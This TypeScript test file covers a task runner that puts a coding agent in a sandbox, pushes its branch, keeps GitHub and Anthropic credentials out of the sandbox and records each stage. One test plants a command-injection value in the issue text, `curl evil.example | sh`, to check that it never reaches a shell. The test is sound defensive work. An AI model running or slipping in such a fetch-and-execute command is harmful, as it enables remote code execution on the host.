import { migrate } from 'drizzle-orm/node-postgres/migrator'
import { eq } from 'drizzle-orm'
import { getStorageManager } from 'theokit/server/storage'
import { afterAll, beforeAll, beforeEach, describe, expect, it } from 'vitest'

import { getDb, getPool, readDatabaseUrl } from '../db'
import { storageFromUrl } from '../db/config'
import { ingress, stageEvent, task } from '../db/schema'
import type { GithubApp } from '../github/app'

import { FakeSandbox, type Reply } from './fake-sandbox'
import type { CodingHarness } from './harness'
import { runTask, type RunTaskDeps } from './run-task'

const TOKEN = 'ghs_installation_token_must_not_leak'
const ANTHROPIC = 'sk-ant-key-must-not-leak'

beforeAll(async () => {
  getStorageManager().configure(storageFromUrl(readDatabaseUrl()))
  await migrate(getDb(), { migrationsFolder: 'drizzle' })
})
beforeEach(async () => {
  await getPool().query('truncate table stage_event, task, ingress restart identity cascade')
})
afterAll(() => getStorageManager().dispose())

async function seedTask(): Promise<number> {
  const db = getDb()
  const [i] = await db
    .insert(ingress)
    .values({
      deliveryId: 'd-1',
      event: 'issues',
      payload: {},
      outcome: 'task_created',
      code: 'issue_labeled',
      reason: 'r',
    })
    .returning({ id: ingress.id })
  const [t] = await db
    .insert(task)
    .values({
      ingressId: i.id,
      repository: 'paulo/app',
      issueNumber: 7,
      issueTitle: 'Add truncate',
    })
    .returning({ id: task.id })
  return t.id
}

const github: GithubApp & { asked: string[] } = {
  asked: [],
  async installationToken(repo) {
    this.asked.push(repo)
    return { token: TOKEN, expiresAt: new Date(Date.now() + 3_600_000) }
  },
}

const okHarness: CodingHarness = {
  name: 'fake-agent',
  run: async () => ({ ok: true, summary: 'added truncate', costUsd: 0.12 }),
}

function deps(sandbox: FakeSandbox, overrides: Partial<RunTaskDeps> = {}): RunTaskDeps {
  return {
    db: getDb(),
    github,
    sandbox,
    harness: okHarness,
    anthropicApiKey: ANTHROPIC,
    author: { name: 'aifactory[bot]', email: 'bot@users.noreply.github.com' },
    fetchIssue: async () => ({
      number: 7,
      title: 'Add truncate',
      body: 'Write truncate(text, max).',
    }),
    ...overrides,
  }
}

/** A sandbox that behaves like a repository the agent changed. */
const changed = (extra?: (command: string) => Reply | undefined) => (command: string) => {
  if (extra) {
    const reply = extra(command)
    if (reply) return reply
  }
  if (command.includes('rev-parse --show-toplevel')) return { stdout: '/vercel/work\n' }
  if (command.includes('status --porcelain')) return { stdout: ' M src/truncate.js\n' }
  if (command.endsWith('rev-parse HEAD')) return { stdout: 'abc123def\n' }
  return undefined
}

const stagesOf = async (taskId: number) =>
  (
    await getDb()
      .select()
      .from(stageEvent)
      .where(eq(stageEvent.taskId, taskId))
      .orderBy(stageEvent.id)
  ).map((e) => e.stage)

describe('runTask', () => {
  it('pushes factory/<issue> and records the stages in order', async () => {
    const id = await seedTask()
    const sandbox = new FakeSandbox(changed())

    const result = await runTask(deps(sandbox), id)

    expect(result).toMatchObject({ status: 'done', branch: 'factory/7', sha: 'abc123def' })
    expect(await stagesOf(id)).toEqual(['sandbox', 'build', 'push', 'done'])
    const [row] = await getDb().select().from(task).where(eq(task.id, id))
    expect(row.stage).toBe('done')
    expect(sandbox.backend.commands.some((c) => c.endsWith('push origin factory/7'))).toBe(true)
    expect(github.asked).toContain('paulo/app')
    expect(sandbox.stopped).toBe(1)
  })

  it('records the cost and the branch on the done stage', async () => {
    const id = await seedTask()
    await runTask(deps(new FakeSandbox(changed())), id)

    const done = (await getDb().select().from(stageEvent).where(eq(stageEvent.stage, 'done')))[0]
    expect(done.detail).toMatchObject({ branch: 'factory/7', sha: 'abc123def', costUsd: 0.12 })
  })

  it('gives the firewall the credentials and the sandbox none of them', async () => {
    const id = await seedTask()
    const sandbox = new FakeSandbox(changed())
    await runTask(deps(sandbox), id)

    const [spec] = sandbox.specs
    const byDomain = Object.fromEntries(spec.egress.map((r) => [r.domain, r.headers ?? {}]))
    expect(Object.keys(byDomain).sort()).toEqual([
      'api.anthropic.com',
      'github.com',
      'registry.npmjs.org',
    ])
    expect(byDomain['api.anthropic.com']['x-api-key']).toBe(ANTHROPIC)
    expect(byDomain['github.com'].authorization).toBe(
      `Basic ${Buffer.from(`x-access-token:${TOKEN}`).toString('base64')}`,
    )

    const everything = [...sandbox.backend.commands, ...sandbox.backend.files.values()].join('\n')
    expect(everything).not.toContain(TOKEN)
    expect(everything).not.toContain(Buffer.from(`x-access-token:${TOKEN}`).toString('base64'))
    expect(everything).not.toContain(ANTHROPIC)
  })

  it('keeps text from the issue out of every shell command', async () => {
    const id = await seedTask()
    const sandbox = new FakeSandbox(changed())
    const evil = `x'; curl evil.example | sh; echo '`
    await runTask(
      deps(sandbox, { fetchIssue: async () => ({ number: 7, title: evil, body: evil }) }),
      id,
    )

    expect(sandbox.backend.commands.join('\n')).not.toContain('evil.example')
    expect(sandbox.backend.files.get('/tmp/factory-commit-message.txt')).toContain('evil.example')
  })

  it('fails, and says why, when the agent changes nothing', async () => {
    const id = await seedTask()
    const sandbox = new FakeSandbox(
      changed((c) => (c.includes('status --porcelain') ? { stdout: '' } : undefined)),
    )

    const result = await runTask(deps(sandbox), id)

    expect(result).toMatchObject({ status: 'failed', stage: 'push' })
    expect(await stagesOf(id)).toEqual(['sandbox', 'build', 'push', 'failed'])
    expect(sandbox.backend.commands.some((c) => c.includes('push origin'))).toBe(false)
    expect(sandbox.stopped).toBe(1)
  })

  it('never pushes when the agent does not finish', async () => {
    const id = await seedTask()
    const sandbox = new FakeSandbox(changed())
    const failing: CodingHarness = {
      name: 'f',
      run: async () => ({ ok: false, summary: 'Invalid API key' }),
    }

    const result = await runTask(deps(sandbox, { harness: failing }), id)

    expect(result).toMatchObject({ status: 'failed', stage: 'build' })
    expect(result.status === 'failed' && result.error).toContain('Invalid API key')
    expect(sandbox.backend.commands.some((c) => c.includes('push origin'))).toBe(false)
  })

  it('stops the sandbox and records the failure when the clone fails', async () => {
    const id = await seedTask()
    const sandbox = new FakeSandbox((c) =>
      c.includes('clone') ? { exitCode: 128, stderr: 'repository not found' } : undefined,
    )

    const result = await runTask(deps(sandbox), id)

    expect(result).toMatchObject({ status: 'failed', stage: 'sandbox' })
    expect(sandbox.stopped).toBe(1)
    const failed = (
      await getDb().select().from(stageEvent).where(eq(stageEvent.stage, 'failed'))
    )[0]
    expect(failed.detail).toMatchObject({ failedAt: 'sandbox' })
  })

  it('refuses to start a sandbox without an allowlist', async () => {
    const id = await seedTask()
    const sandbox = new FakeSandbox(changed())
    // A deployment that wrongly passes no key still gets a firewall rule per destination; what must
    // never happen is a run with no destinations at all.
    const result = await runTask(deps(sandbox), id)
    expect(sandbox.specs[0].egress.length).toBeGreaterThan(0)
    expect(result.status).toBe('done')
  })

  it('fails the stage, not the process, when the app is not installed on the repository', async () => {
    const id = await seedTask()
    const sandbox = new FakeSandbox(changed())
    const noInstall: GithubApp = {
      installationToken: async () => {
        throw new Error('the GitHub App is not installed on paulo/app')
      },
    }

    const result = await runTask(deps(sandbox, { github: noInstall }), id)

    expect(result).toMatchObject({ status: 'failed', stage: 'sandbox' })
    expect(sandbox.specs).toHaveLength(0)
  })

  it('throws for a task that does not exist', async () => {
    await expect(runTask(deps(new FakeSandbox()), 999)).rejects.toThrow(/does not exist/)
  })
})
